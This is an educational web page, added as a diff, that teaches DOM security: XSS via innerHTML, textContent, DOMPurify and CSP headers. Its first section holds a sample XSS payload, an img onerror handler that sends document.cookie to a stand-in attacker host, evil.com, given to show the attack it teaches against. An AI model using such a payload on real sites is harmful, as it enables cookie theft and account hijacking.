@@ -1,0 +1,217 @@
+<!--
+HAP Educational Content © 2026 Cynthia Teeters. All rights reserved.
+HyBit A. ProtoBot (HAP) character and the apprentice learning methodology are proprietary educational innovations.
+-->
+---
+import MainLayout from '../../layouts/MainLayout.astro';
+import CodeBlock from '../../components/CodeBlock.astro';
+---
+
+<MainLayout
+    title="DOM Security Awareness | HAP's Learning Lab"
+    description="Quick reference for DOM security: XSS prevention, safe coding patterns, sanitization libraries, and Content Security Policy headers."
+    headerTitle="DOM Security Awareness"
+    headerSubtitle="Quick Reference"
+    avatarImage="https://res.cloudinary.com/cynthia-teeters/image/upload/f_auto,q_auto,w_200,c_limit/v1763230464/hap-sconcerned-laptop_frh5ua.jpg"
+    avatarAlt="HAP looking concerned while coding"
+    introContent="<p>innerHTML is powerful — and that's exactly why it's dangerous. Here's what I learned about keeping the DOM safe. 🟠</p>"
+    showNavigation={false}
+    footerReminder="createElement + textContent + appendChild = safe by default. No HTML parsing, no injection risk."
+>
+
+    <!-- ============================================================
+         SECTION 1: XSS (Cross-Site Scripting)
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>XSS (Cross-Site Scripting)</h2>
+
+            <p class="mb-2"><strong>Cross-Site Scripting (XSS)</strong> happens when an attacker injects malicious code into a web page, and the browser executes it as if it were part of the original site.</p>
+
+            <p class="mb-2">The most common DOM-based XSS vector is <code>innerHTML</code>. When I use <code>innerHTML</code> to insert a string, the browser <strong>parses that string as HTML</strong> — creating real elements, including elements that can execute JavaScript.</p>
+
+            <div class="prompt-box">
+                <div class="prompt-label">How innerHTML opens the door to XSS:</div>
+                <CodeBlock code={`// A user types this into a form field:
+const userInput = '<img src="x" onerror="document.location=\'https://evil.com/steal?\'+document.cookie">';
+
+// Your code puts it on the page with innerHTML:
+element.innerHTML = userInput;
+
+// → Browser creates a real <img> element
+// → Image fails to load → onerror fires
+// → Attacker's script runs with full page access
+// → User's cookies are sent to the attacker's server`} lang="javascript" />
+                <p class="code-comment mt-1">The attacker didn't need access to the server. They exploited the fact that innerHTML parses strings as HTML.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 2: The Safe Code Path
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>The Safe Code Path</h2>
+
+            <p class="mb-2">The safest pattern for putting user-provided content into the DOM avoids HTML parsing entirely:</p>
+
+            <div class="prompt-box">
+                <div class="prompt-label">createElement + textContent + appendChild:</div>
+                <CodeBlock code={`// Create the element programmatically
+const paragraph = document.createElement('p');
+
+// Set its text with textContent (no parsing!)
+paragraph.textContent = userInput;
+
+// Add it to the page
+container.appendChild(paragraph);
+
+// Even if userInput contains <script> tags or onerror handlers,
+// they display as literal text — never executed`} lang="javascript" />
+                <p class="code-comment mt-1">No HTML string is ever parsed. No injection is possible. This is the safest path.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 3: The Safety Hierarchy
+         ============================================================ -->
+    <section class="content-section">
+        <div class="tips-container">
+            <h2 class="section-heading-centered">The Safety Hierarchy</h2>
+
+            <div class="tip-card">
+                <div class="tip-number">1</div>
+                <div>
+                    <h3>createElement + textContent (Safest)</h3>
+                    <p>Build elements programmatically and set text with <code>textContent</code>. No HTML parsing happens at all. This is the default choice for any user-provided content.</p>
+                </div>
+            </div>
+
+            <div class="tip-card">
+                <div class="tip-number">2</div>
+                <div>
+                    <h3>createElement + appendChild (Programmatic, Safe)</h3>
+                    <p>Build complex DOM structures entirely with <code>createElement</code>, <code>setAttribute</code>, and <code>appendChild</code>. More verbose, but no parsing means no injection.</p>
+                </div>
+            </div>
+
+            <div class="tip-card">
+                <div class="tip-number">3</div>
+                <div>
+                    <h3>innerHTML + DOMPurify (Library Sanitization)</h3>
+                    <p>When you need to render rich HTML (like formatted text from a CMS), sanitize it first with a library like <strong>DOMPurify</strong>. It strips dangerous elements and attributes before they reach the DOM.</p>
+                </div>
+            </div>
+
+            <div class="tip-card">
+                <div class="tip-number">4</div>
+                <div>
+                    <h3>CSP Headers (Server-Side Safety Net)</h3>
+                    <p>Content Security Policy headers tell the browser which scripts are allowed to run. Even if an XSS vulnerability exists in the code, CSP can prevent the injected script from executing.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 4: Sanitization Libraries
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>Sanitization Libraries</h2>
+
+            <p class="mb-2">Sometimes I <em>need</em> to insert HTML — for example, rendering formatted content from a database. In those cases, I sanitize the HTML before inserting it.</p>
+
+            <div class="prompt-box">
+                <div class="prompt-label">Using DOMPurify (v3.2.4+):</div>
+                <CodeBlock code={`import DOMPurify from 'dompurify';
+
+// Sanitize before inserting
+const cleanHTML = DOMPurify.sanitize(untrustedHTML);
+element.innerHTML = cleanHTML;
+
+// DOMPurify strips:
+// - <script> tags
+// - onerror, onclick, and other event handlers
+// - javascript: URLs
+// - Other dangerous patterns`} lang="javascript" />
+                <p class="code-comment mt-1">DOMPurify is the most widely used DOM sanitization library. Always use version 3.2.4 or higher.</p>
+            </div>
+
+            <div class="hap-note-callout mt-2">
+                <div class="hap-note-content">
+                    <h3>🟠 Important:</h3>
+                    <p>Sanitization is a fallback, not a first choice. If I can use <code>textContent</code> instead of <code>innerHTML</code>, I do. Sanitization libraries are for the cases where I genuinely need HTML rendering.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 5: CSP Headers
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>CSP Headers</h2>
+
+            <p class="mb-2"><strong>Content Security Policy (CSP)</strong> is a server-side defense. It tells the browser which sources are allowed for scripts, styles, images, and other resources.</p>
+
+            <div class="prompt-box">
+                <div class="prompt-label">CSP in a Netlify netlify.toml file:</div>
+                <CodeBlock code={`[[headers]]
+  for = "/*"
+  [headers.values]
+    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https://res.cloudinary.com"`} lang="text" />
+                <p class="code-comment mt-1">This policy only allows scripts from the same origin. Injected inline scripts would be blocked by the browser.</p>
+            </div>
+
+            <p class="mt-2">CSP can also be set via a <code>&lt;meta&gt;</code> tag in the HTML head, or through edge functions that add headers dynamically.</p>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 6: Defense in Depth
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>Defense in Depth</h2>
+
+            <p class="mb-2">Security works best in layers. No single defense is perfect, so I learned to combine them:</p>
+
+            <div class="analysis-grid">
+                <div class="analysis-point">
+                    <h3>Level 1: Code Decisions</h3>
+                    <p>Use <code>textContent</code> instead of <code>innerHTML</code>. Build elements with <code>createElement</code>. Sanitize with DOMPurify when HTML rendering is required. These are decisions I make every time I write code.</p>
+                </div>
+
+                <div class="analysis-point">
+                    <h3>Level 2: Server Configuration</h3>
+                    <p>Set CSP headers to restrict what the browser will execute. Even if a vulnerability slips through my code, CSP can block the attack from succeeding.</p>
+                </div>
+            </div>
+
+            <div class="hap-note-callout mt-2">
+                <div class="hap-note-content">
+                    <h3>🟠 My Takeaway:</h3>
+                    <p>I don't rely on any single defense. I write safe code <em>and</em> configure server protections. If one layer fails, the other is still there.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================================================
+         SECTION 7: Forward Pointer
+         ============================================================ -->
+    <section class="content-section">
+        <div class="topic-section">
+            <h2>Looking Ahead</h2>
+
+            <p>In Testing Lab Week 3, I'll add automated security tools to my workflow: <strong>ESLint</strong> rules that flag dangerous DOM methods, <strong>npm audit</strong> to check for vulnerable dependencies, and <strong>Dependabot</strong> to keep packages updated automatically.</p>
+
+            <p class="mt-1">Security isn't a one-time decision — it's a habit that gets reinforced with the right tools. 🟠</p>
+        </div>
+    </section>
+
+</MainLayout>
